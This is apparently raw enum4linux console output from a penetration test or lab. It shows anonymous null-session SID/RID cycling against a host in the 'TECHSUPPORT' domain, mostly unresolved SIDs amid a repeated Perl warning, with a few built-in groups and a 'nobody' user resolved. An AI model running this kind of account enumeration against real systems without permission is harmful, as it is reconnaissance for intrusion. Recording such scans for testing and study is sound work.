Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
S-1-5-32-525 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
S-1-5-32-526 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
S-1-5-32-527 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
S-1-5-32-528 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
S-1-5-32-529 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
S-1-5-32-530 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
S-1-5-32-531 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
S-1-5-32-532 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
S-1-5-32-533 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
S-1-5-32-534 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
S-1-5-32-535 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
S-1-5-32-536 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
S-1-5-32-537 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
S-1-5-32-538 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
S-1-5-32-539 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
S-1-5-32-540 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
S-1-5-32-541 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
S-1-5-32-542 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
S-1-5-32-543 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
S-1-5-32-544 BUILTIN\Administrators (Local Group)
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
S-1-5-32-545 BUILTIN\Users (Local Group)
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
S-1-5-32-546 BUILTIN\Guests (Local Group)
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
S-1-5-32-547 BUILTIN\Power Users (Local Group)
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
S-1-5-32-548 BUILTIN\Account Operators (Local Group)
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
S-1-5-32-549 BUILTIN\Server Operators (Local Group)
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
S-1-5-32-550 BUILTIN\Print Operators (Local Group)
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
S-1-5-32-1000 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
S-1-5-32-1001 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
S-1-5-32-1002 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
S-1-5-32-1003 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
S-1-5-32-1004 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
S-1-5-32-1005 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
S-1-5-32-1006 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
S-1-5-32-1007 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
S-1-5-32-1008 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
S-1-5-32-1009 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
S-1-5-32-1010 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
S-1-5-32-1011 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
S-1-5-32-1012 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
S-1-5-32-1013 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
S-1-5-32-1014 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
S-1-5-32-1015 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
S-1-5-32-1016 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
S-1-5-32-1017 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
S-1-5-32-1018 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
S-1-5-32-1019 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
S-1-5-32-1020 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
S-1-5-32-1021 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
S-1-5-32-1022 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
S-1-5-32-1023 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
S-1-5-32-1024 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
S-1-5-32-1025 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
S-1-5-32-1026 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
S-1-5-32-1027 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
S-1-5-32-1028 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
S-1-5-32-1029 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
S-1-5-32-1030 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
S-1-5-32-1031 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
S-1-5-32-1032 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
S-1-5-32-1033 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
S-1-5-32-1034 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
S-1-5-32-1035 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
S-1-5-32-1036 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
S-1-5-32-1037 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
S-1-5-32-1038 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
S-1-5-32-1039 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
S-1-5-32-1040 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
S-1-5-32-1041 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
S-1-5-32-1042 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
S-1-5-32-1043 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
S-1-5-32-1044 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
S-1-5-32-1045 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
S-1-5-32-1046 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
S-1-5-32-1047 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
S-1-5-32-1048 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
S-1-5-32-1049 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
S-1-5-32-1050 *unknown*\*unknown* (8)
[+] Enumerating users using SID S-1-5-21-2071169391-1069193170-3284189824 and logon username '', password ''
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
S-1-5-21-2071169391-1069193170-3284189824-500 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
S-1-5-21-2071169391-1069193170-3284189824-501 TECHSUPPORT\nobody (Local User)
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
S-1-5-21-2071169391-1069193170-3284189824-502 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
S-1-5-21-2071169391-1069193170-3284189824-503 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
S-1-5-21-2071169391-1069193170-3284189824-504 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
S-1-5-21-2071169391-1069193170-3284189824-505 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
S-1-5-21-2071169391-1069193170-3284189824-506 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
S-1-5-21-2071169391-1069193170-3284189824-507 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
S-1-5-21-2071169391-1069193170-3284189824-508 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
S-1-5-21-2071169391-1069193170-3284189824-509 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
S-1-5-21-2071169391-1069193170-3284189824-510 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
S-1-5-21-2071169391-1069193170-3284189824-511 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
S-1-5-21-2071169391-1069193170-3284189824-512 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
S-1-5-21-2071169391-1069193170-3284189824-513 TECHSUPPORT\None (Domain Group)
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
S-1-5-21-2071169391-1069193170-3284189824-514 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
S-1-5-21-2071169391-1069193170-3284189824-515 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
S-1-5-21-2071169391-1069193170-3284189824-516 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
S-1-5-21-2071169391-1069193170-3284189824-517 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
S-1-5-21-2071169391-1069193170-3284189824-518 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
S-1-5-21-2071169391-1069193170-3284189824-519 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
S-1-5-21-2071169391-1069193170-3284189824-520 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
S-1-5-21-2071169391-1069193170-3284189824-521 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
S-1-5-21-2071169391-1069193170-3284189824-522 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
S-1-5-21-2071169391-1069193170-3284189824-523 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
S-1-5-21-2071169391-1069193170-3284189824-524 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
S-1-5-21-2071169391-1069193170-3284189824-525 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
S-1-5-21-2071169391-1069193170-3284189824-526 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
S-1-5-21-2071169391-1069193170-3284189824-527 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
S-1-5-21-2071169391-1069193170-3284189824-528 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
S-1-5-21-2071169391-1069193170-3284189824-529 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
S-1-5-21-2071169391-1069193170-3284189824-530 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
S-1-5-21-2071169391-1069193170-3284189824-531 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
S-1-5-21-2071169391-1069193170-3284189824-532 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
S-1-5-21-2071169391-1069193170-3284189824-533 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
S-1-5-21-2071169391-1069193170-3284189824-534 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
S-1-5-21-2071169391-1069193170-3284189824-535 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
S-1-5-21-2071169391-1069193170-3284189824-536 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
S-1-5-21-2071169391-1069193170-3284189824-537 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
S-1-5-21-2071169391-1069193170-3284189824-538 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
S-1-5-21-2071169391-1069193170-3284189824-539 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
S-1-5-21-2071169391-1069193170-3284189824-540 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
S-1-5-21-2071169391-1069193170-3284189824-541 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
S-1-5-21-2071169391-1069193170-3284189824-542 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
S-1-5-21-2071169391-1069193170-3284189824-543 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
S-1-5-21-2071169391-1069193170-3284189824-544 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
S-1-5-21-2071169391-1069193170-3284189824-545 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
S-1-5-21-2071169391-1069193170-3284189824-546 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
S-1-5-21-2071169391-1069193170-3284189824-547 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
S-1-5-21-2071169391-1069193170-3284189824-548 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
S-1-5-21-2071169391-1069193170-3284189824-549 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
S-1-5-21-2071169391-1069193170-3284189824-550 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
S-1-5-21-2071169391-1069193170-3284189824-1000 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
S-1-5-21-2071169391-1069193170-3284189824-1001 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
S-1-5-21-2071169391-1069193170-3284189824-1002 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
S-1-5-21-2071169391-1069193170-3284189824-1003 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
S-1-5-21-2071169391-1069193170-3284189824-1004 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
S-1-5-21-2071169391-1069193170-3284189824-1005 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
S-1-5-21-2071169391-1069193170-3284189824-1006 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
S-1-5-21-2071169391-1069193170-3284189824-1007 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
S-1-5-21-2071169391-1069193170-3284189824-1008 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
S-1-5-21-2071169391-1069193170-3284189824-1009 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
S-1-5-21-2071169391-1069193170-3284189824-1010 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
S-1-5-21-2071169391-1069193170-3284189824-1011 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
S-1-5-21-2071169391-1069193170-3284189824-1012 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
S-1-5-21-2071169391-1069193170-3284189824-1013 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
S-1-5-21-2071169391-1069193170-3284189824-1014 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
S-1-5-21-2071169391-1069193170-3284189824-1015 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
S-1-5-21-2071169391-1069193170-3284189824-1016 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
S-1-5-21-2071169391-1069193170-3284189824-1017 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
S-1-5-21-2071169391-1069193170-3284189824-1018 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
S-1-5-21-2071169391-1069193170-3284189824-1019 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
S-1-5-21-2071169391-1069193170-3284189824-1020 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
S-1-5-21-2071169391-1069193170-3284189824-1021 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
S-1-5-21-2071169391-1069193170-3284189824-1022 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
S-1-5-21-2071169391-1069193170-3284189824-1023 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
S-1-5-21-2071169391-1069193170-3284189824-1024 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
S-1-5-21-2071169391-1069193170-3284189824-1025 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
S-1-5-21-2071169391-1069193170-3284189824-1026 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
S-1-5-21-2071169391-1069193170-3284189824-1027 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
S-1-5-21-2071169391-1069193170-3284189824-1028 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
S-1-5-21-2071169391-1069193170-3284189824-1029 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
S-1-5-21-2071169391-1069193170-3284189824-1030 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 834.
